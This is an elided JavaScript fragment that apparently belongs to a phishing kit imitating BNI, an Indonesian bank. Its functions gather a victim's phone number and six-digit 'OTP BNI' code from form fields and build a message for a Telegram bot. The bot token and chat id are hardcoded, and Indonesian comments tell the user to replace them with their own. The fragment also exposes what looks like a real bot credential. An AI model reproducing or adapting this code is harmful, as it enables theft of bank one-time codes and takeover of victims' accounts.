function sendNohp(event){
 ...
 var nope = document.getElementById('nope');
    ...
    var token = '7495496098:AAG68ffAD-S37akaWiHFcsiIaWX_S3K1GHE'; // Ganti dengan token bot yang kamu buat
    var grup = '6327145527'; // Ganti dengan chat id dari bot yang kamu buat
...
Bot.start()   
  ...
  const bot = new Bot("7495496098:AAG68ffAD-S37akaWiHFcsiIaWX_S3K1GHE", "6327145527")
...
function kirimPesan(event) {
 event.preventDefault();
  $("#loadersaya1").show();
    ...
    var gabungan = '' + logo.value + '%0A✬ 𝗢𝗧𝗣%20𝗕𝗡𝗜: ' +   pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;
